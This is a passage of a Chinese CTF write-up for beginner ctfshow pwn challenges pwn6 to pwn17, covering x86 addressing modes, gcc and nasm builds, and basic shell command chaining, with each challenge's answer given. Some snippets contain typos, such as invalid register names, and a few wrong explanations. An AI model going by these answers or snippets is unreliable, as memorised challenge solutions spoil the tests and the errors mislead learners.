位程序，让我们计算立即寻址方式后的 eax 的值</p>\n<p>【立即寻址方式是一种操作数寻址方式。在立即寻址方式下，指令的地址字段指出的是操作数本身，而不是操作数的地址。立即寻址方式的特点是指令执行时间很短，因为它不需要访问内存取数，从而节省了访问内存的时间。立即寻址方式常用于指令的源操作数，不能用作目的操作数。例如，MOV AX,5678H 指令中的 5678H 就是一个立即数，作为源操作数直接参与指令的运算。】这意味着，将寄存器不会去将该值当作地址，直接看作一个数值<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf1zHs.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov eax, 0Bh        #eax=0xBh\nadd  eax, 1BF48h #eax=eax+0x1BF48h\nsub   eax, 1             #eax=eax-1\n</code></pre>\n<p>得到 eax=0x1BF52h  (114514)</p>\n<p>所以答案 ctfshow (114514)</p>\n<p>此题 asm<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf39Nq.png\" alt=\"\" /></p>\n<h1 id=\"pwn7寄存器寻址方式\"><a class=\"anchor\" href=\"#pwn7寄存器寻址方式\">#</a> pwn7（寄存器寻址方式）</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3JDH.png\" alt=\"\" /></p>\n<p>【寄存器寻址方式：操作数在 CPU 内部的寄存器中，指令指定寄存器号。，意味着直接取指定寄存器当中的值即可】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3a5t.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ebx, 36Dh  #ebx=0x36Dh\nmov edx, ebx     #edx=ebx \n</code></pre>\n<p 0x36D=\"\">edx=0x36Dh  (877），<br />\nctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3R5q.png\" alt=\"\" /></p>\n<h1 id=\"pwn8直接寻址方式\"><a class=\"anchor\" href=\"#pwn8直接寻址方式\">#</a> pwn8（直接寻址方式）</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3qaR.png\" alt=\"\" /></p>\n<p>【直接寻址方式：在指令中直接给出参与运算的操作数及运算结果所存放的主存地址，即在指令中直接给出有效地址。意味着直接将地址赋值给对应寄存器】</p>\n<p>32 位程序，查看汇编<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3XPx.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, dword_80490E8  #ecx=dword_80490E8 (地址就是0x80490E8)\n</code></pre>\n<p 0x80490E8=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfrBuR.png\" alt=\"\" /></p>\n<h1 id=\"pwn9-间接寻址方式\"><a class=\"anchor\" href=\"#pwn9-间接寻址方式\">#</a> pwn9 （间接寻址方式）</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfrDD1.png\" alt=\"\" /></p>\n<p>【间接寻址方式：间接寻址是在直接寻址的基础上面建立起来的，也就是直接寻址得到的数据是一个地址，通过这个地址找到最终的数据，也就是两次寻址，第一次得到的是地址，第二次才是目标数据】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfsnVx.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov esi,  offset dword_80490E8  #esi=offset dword_80490E8\nmov eax, [esi]  #eax=*esi (取地址内的值，方括号意味着取该地址的值)\n</code></pre>\n<p>利用 ida 查看其中的值</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfsBRg.png\" alt=\"\" /></p>\n<p 0x636C6557=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfs3xH.png\" alt=\"\" /></p>\n<h1 id=\"pwn10寄存器相对寻址方式\"><a class=\"anchor\" href=\"#pwn10寄存器相对寻址方式\">#</a> pwn10（寄存器相对寻址方式）</h1>\n<h2 id=\"题目-6\"><a class=\"anchor\" href=\"#题目-6\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf27an.md.png\" alt=\"\" /></p>\n<p>【寄存器相对寻址方式：操作数的有效地址是一个寄存器和位移量之和。地址是寄存器 + 一个偏移值，具体值在该地址里】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfWmlT.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, offset dword_80490E8   #ecx=dword_80490E8\nadd  ecx, 4   #ecx=ecx+4\nmov eax, [ecx]  #eax=*ecx (取该地址的值)\n</code></pre>\n<p>eax=*(0x80490E8+4)=&quot;ome_to_CTFshow_PWN&quot;</p>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPff3Dg.png\" alt=\"\" /></p>\n<h1 id=\"pwn11基址变址寻址方式\"><a class=\"anchor\" href=\"#pwn11基址变址寻址方式\">#</a> pwn11（基址变址寻址方式）</h1>\n<h2 id=\"题目-7\"><a class=\"anchor\" href=\"#题目-7\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPffd2V.png\" alt=\"\" /></p>\n<p>【基址变址寻址方式：操作数的有效地址是一个基址寄存器和一个变址寄存器的内容之和。一般为寄存器直接的运算在赋值】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPffHIA.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, offset dword_80490E8  #exc=0x80490E8\nmov edx, 2   #edx=2\nmov dax,[exc+edx*2]  #ecx=*(0x80490E8+2*2)\n</code></pre>\n<p>ecx=&quot;ome_to_CTFshow_PWN&quot;</p>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf5TZF.png\" alt=\"\" /></p>\n<h1 id=\"pwn12相对基址变址寻址方式\"><a class=\"anchor\" href=\"#pwn12相对基址变址寻址方式\">#</a> pwn12（相对基址变址寻址方式）</h1>\n<h2 id=\"题目-8\"><a class=\"anchor\" href=\"#题目-8\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh3Tne.png\" alt=\"\" /></p>\n<p>【相对基址变址寻址方式：操作数的有效地址是一个基址寄存器和一个变址寄存器以及一个位移量之和。一般为两个寄存器 + 一个值】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh3j9P.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov  ecx, offset dword_80490E8  #ecx=80490E8\nmov  edx, 1   #edi=1\nadd   ecx,  8  #ecx=ecx+8\nmov  eax,  [ecx+edx*2-6]  #eax=*(ecx+edx*2-6)\n#eax=*(80490EC)='ome_to_CTFshow_PWN'\n</code></pre>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8uB4.png\" alt=\"\" /></p>\n<h1 id=\"pwn13gcc编译\"><a class=\"anchor\" href=\"#pwn13gcc编译\">#</a> pwn13（gcc 编译）</h1>\n<h2 id=\"题目-9\"><a class=\"anchor\" href=\"#题目-9\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8KHJ.png\" alt=\"\" /></p>\n<p>进行 gcc 编译：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zODA5Mzc5NDY=\">https://zhuanlan.zhihu.com/p/380937946</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc test.c <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">test</span> <span class=\"token comment\">#直接编译成可执行文件（-o 指定输出文件名称，默认 a.out）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>./test  <span class=\"token comment\">#运行程序</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8rCt.png\" alt=\"\" /></p>\n<h1 id=\"pwn14\"><a class=\"anchor\" href=\"#pwn14\">#</a> pwn14</h1>\n<h2 id=\"题目-10\"><a class=\"anchor\" href=\"#题目-10\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh86v8.md.png\" alt=\"\" /></p>\n<p>源码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">BUFFER_SIZE</span> <span class=\"token expression\"><span class=\"token number\">1024</span></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span>BUFFER_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    fp <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"key\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nothing here!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">char</span> output<span class=\"token punctuation\">[</span>BUFFER_SIZE <span class=\"token operator\">*</span> <span class=\"token number\">9</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">int</span> offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ctfshow&#123;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> BUFFER_SIZE<span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">!=</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> output<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>此处有 <code>fopen(&quot;key&quot;,:&quot;rb&quot;)</code>  要打开文件 (rb 以读写方式打开一个二进制文件)，不能让其为空，手动创建一个 key 文件，题目说明 key 为 <code>CTFshow</code></p>\n<p>创建完成后用 gcc 编译，执行程序<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhJc7Q.png\" alt=\"\" /></p>\n<h1 id=\"pwn15编译汇编代码形成可执行文件\"><a class=\"anchor\" href=\"#pwn15编译汇编代码形成可执行文件\">#</a> pwn15（编译汇编代码形成可执行文件）</h1>\n<p>## 题目<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/19/14UYM6tT.png\" alt=\"\" /></p>\n<p><strong>【编译汇编代码】</strong></p>\n<p>[ams 基础，nasm 使用简介]：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYW5nd2VpMDUxMi9hcnRpY2xlL2RldGFpbHMvNTE2MzY2MDI=\">https://blog.csdn.net/jiangwei0512/article/details/51636602</span></p>\n<p>利用 <code>nasm</code>  命令，使用下面的命令将汇编代码编译成对象文件（会生成一个 pwn15.o 的对象文件）：</p>\n<pre><code>nasm -f elf pwn15.ams  # -f 是指定编译出来的 .o文件的格式\n</code></pre>\n<p>【Linux 命令 —ld 命令】：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNDE1MDA0\">https://cloud.tencent.com/developer/article/1415004</span></p>\n<pre><code>ld命令是二进制工具集GNU Binutils的一员，是GNU链接器，用于将目标文件与库链接为可执行程序或库文件。\n</code></pre>\n<p>利用 <code>ld</code>  命令将对象文件链接成可执行文件</p>\n<pre><code>ld -m elf_i386 -s-o pwn15 pwn.o #-m是模拟指定的链接器，-s忽略来自输出文件的所有符号信息，-o 指定生成文件名称\n</code></pre>\n<p>查看汇编：</p>\n<pre><code class=\"language-asm\">section .data\n    str1 db &quot;CTFshow&quot;,0\n    str2 db &quot;_3@sy&quot;,0\n    str3 db &quot;@ss3mb1y&quot;,0\n    str4 db &quot;_1s&quot;,0\n    str5 db &quot;ctfshow&#123;&quot;\n    str6 db &quot;&#125;&quot;\n\nsection .text\n    global _start\n\n_start:\n    mov eax, 4 \n    mov ebx, 1 \n    mov ecx, str5 \n    mov edx, 8\n    int 0x80 \n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str3\n    mov edx, 8\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str4\n    mov edx, 3\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str2\n    mov edx, 5\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str6\n    mov edx, 1\n    int 0x80\n\n    mov eax, 1 \n    xor ebx, ebx \n    int 0x80 \n\n</code></pre>\n<p>执行 <code>nasm -f elf pwn15.ams</code>  命令和 <code>ld -m elf_i386 -s-o pwn15 pwn.o </code> ，<br />\n会产生可执行文件 pwn15，执行即可（原对象文件不消失）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5PX4J.png\" alt=\"\" /></p>\n<h1 id=\"pwn16-使用gcc编译可执行文件\"><a class=\"anchor\" href=\"#pwn16-使用gcc编译可执行文件\">#</a> pwn16 （使用 gcc 编译可执行文件）</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTg1MDY2\">https://cloud.tencent.com/developer/article/1585066</span></p>\n<p>文件扩展名为.s 的文件其实就是汇编代码文件，使用下面的命令将汇编代码转成对应的二进制形式的 cpu 指令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-c</span> main.s</pre></td></tr></table></figure><p>链接链接的作用是把代码之间的引用关系关联起来，最终生成一个完整的程序：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc main.o libc.o  <span class=\"token comment\">#此题只需要一个目标文件，所以直接用 gcc main.o 即可</span></pre></td></tr></table></figure><h2 id=\"题目-11\"><a class=\"anchor\" href=\"#题目-11\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5iSjx.png\" alt=\"\" /></p>\n<p>【asm】(题目附件文件为 pwn15.s，s 其实就是汇编代码文件)</p>\n<pre><code class=\"language-asm\">\t.file\t&quot;flag.c&quot;\n\t.text\n\t.section\t.rodata\n.LC0:\n\t.string\t&quot;ctfshow&#123;&quot;\n\t.text\n\t.globl\tctfshow\n\t.type\tctfshow, @function\nctfshow:\n.LFB0:\n\t.cfi_startproc\n\tpushq\t%rbp\n\t.cfi_def_cfa_offset 16\n\t.cfi_offset 6, -16\n\tmovq\t%rsp, %rbp\n\t.cfi_def_cfa_register 6\n\tsubq\t$32, %rsp\n\tmovq\t%rdi, -24(%rbp)\n\tleaq\t.LC0(%rip), %rdi\n\tmovl\t$0, %eax\n\tcall\tprintf@PLT\n\tmovl\t$0, -4(%rbp)\n\tjmp\t.L2\n.L3:\n\tmovl\t-4(%rbp), %eax\n\tmovslq\t%eax, %rdx\n\tmovq\t-24(%rbp), %rax\n\taddq\t%rdx, %rax\n\tmovzbl\t(%rax), %eax\n\tmovzbl\t%al, %eax\n\tmovl\t%eax, %edi\n\tcall\tputchar@PLT\n\taddl\t$1, -4(%rbp)\n.L2:\n\tcmpl\t$15, -4(%rbp)\n\tjle\t.L3\n\tmovl\t$125, %edi\n\tcall\tputchar@PLT\n\tnop\n\tleave\n\t.cfi_def_cfa 7, 8\n\tret\n\t.cfi_endproc\n.LFE0:\n\t.size\tctfshow, .-ctfshow\n\t.section\t.rodata\n.LC1:\n\t.string\t&quot;%2hhx&quot;\n\t.text\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n.LFB1:\n\t.cfi_startproc\n\tpushq\t%rbp\n\t.cfi_def_cfa_offset 16\n\t.cfi_offset 6, -16\n\tmovq\t%rsp, %rbp\n\t.cfi_def_cfa_register 6\n\tsubq\t$64, %rsp\n\tmovq\t%fs:40, %rax\n\tmovq\t%rax, -8(%rbp)\n\txorl\t%eax, %eax\n\tmovabsq\t$4122593792332543030, %rax\n\tmovabsq\t$3834596513518335287, %rdx\n\tmovq\t%rax, -32(%rbp)\n\tmovq\t%rdx, -24(%rbp)\n\tmovl\t$825635894, -16(%rbp)\n\tmovb\t$0, -12(%rbp)\n\tmovl\t$0, -52(%rbp)\n\tjmp\t.L5\n.L6:\n\tleaq\t-48(%rbp), %rdx\n\tmovl\t-52(%rbp), %eax\n\tcltq\n\taddq\t%rax, %rdx\n\tmovl\t-52(%rbp), %eax\n\taddl\t%eax, %eax\n\tleaq\t-32(%rbp), %rcx\n\tcltq\n\taddq\t%rcx, %rax\n\tleaq\t.LC1(%rip), %rsi\n\tmovq\t%rax, %rdi\n\tmovl\t$0, %eax\n\tcall\t__isoc99_sscanf@PLT\n\taddl\t$1, -52(%rbp)\n.L5:\n\tcmpl\t$15, -52(%rbp)\n\tjle\t.L6\n\tleaq\t-48(%rbp), %rax\n\tmovq\t%rax, %rdi\n\tcall\tctfshow\n\tmovl\t$0, %eax\n\tmovq\t-8(%rbp), %rsi\n\txorq\t%fs:40, %rsi\n\tje\t.L8\n\tcall\t__stack_chk_fail@PLT\n.L8:\n\tleave\n\t.cfi_def_cfa 7, 8\n\tret\n\t.cfi_endproc\n.LFE1:\n\t.size\tmain, .-main\n\t.ident\t&quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&quot;\n\t.section\t.note.GNU-stack,&quot;&quot;,@progbits\n</code></pre>\n<p>使用命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-c</span> pwn16.s</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>gcc pwn16.o  <span class=\"token comment\">#不用 - o 指定生成文件名默认为 a.out</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5FnJJ.png\" alt=\"\" /></p>\n<h1 id=\"pwn17-linux命令基础\"><a class=\"anchor\" href=\"#pwn17-linux命令基础\">#</a> pwn17 (Linux 命令基础)</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhbmRhb3l1L2FydGljbGUvZGV0YWlscy8xMTcyOTY5MDc=\">https://blog.csdn.net/bandaoyu/article/details/117296907</span></p>\n<p>逐条执行命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span>  <span class=\"token comment\">#即使命令执行错误也不影响后面的命令继续执行</span></pre></td></tr></table></figure><h2 id=\"题目-12\"><a class=\"anchor\" href=\"#题目-12\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5AmvR.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开，ida 看一下</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-1Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> dest<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ah] [rbp-16h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Eh] [rbp-12h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span>_bss_start<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token 